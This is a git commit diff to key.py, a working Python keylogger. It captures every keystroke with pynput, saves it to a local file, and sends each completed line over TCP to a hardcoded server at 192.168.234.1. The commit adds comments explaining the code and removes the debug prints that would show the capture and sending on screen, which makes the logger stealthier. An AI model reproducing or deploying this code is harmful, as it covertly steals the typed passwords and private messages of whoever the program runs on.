95bd9850a3e193da805e0d181310d1f9e457b79d
DHANVANTHGS <dhanvanthgs25@gmail.com>
2025-04-03 22:21:48 +0530

    Update key.py

--- key.py
+++ key.py
@@ -2,34 +2,38 @@ import socket
 from pynput.keyboard import Key,Listener
 
 keyboard=Listener()
-data=""
+#To store the keys entered by user
+data=""  
 pressed_keys=set()
 
+#Server ip 
 Host='192.168.234.1'
 port =3001
 
+#connection is established at ipv4 and at TCP protocol
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((Host, port))
 
+#the file is sent in a encoded way
 fname='key.txt'
 client.send(fname.encode())
 
+#when key is pressed the below function would be executed
 def on_press(key):
     with open("Key.txt","a") as a:
        global data
        try:
            pressed_keys.add(key)
+           # to check if the entered key is characters (a-z,A-Z,0-9)
            if hasattr(key,'char'):
               data+=key.char
-           elif isinstance(key,Key):
+           elif isinstance(key,Key):   # to check if it is any spl key like enter,space,ctrl,etc...
                if (key.name!="shift" and key.name!="space" and key.name!="ctrl_l" and key.name!="ctrl_r"):
                    data+=" "+key.name+" "
                if (key.name=="enter"):
+                   #when enter is encountered the data would be sent to the server 
                    data+="\n"
-                   print(data)
-                   print("entering data")
                    a.write(data)
-                   print("Sending data to server...")
                    client.send(data.encode())
                    data=""
                elif (key.name=="shift"):
@@ -41,9 +45,8 @@ def on_press(key):
        except Exception as e:
            print(f"Error: {e}")
 
-
+#function to be executed when the key is released
 def on_release(key):
-    print(key,"relaesed")
     pressed_keys.remove(key)
         
 with Listener(on_press=on_press,on_release=on_release) as listener:
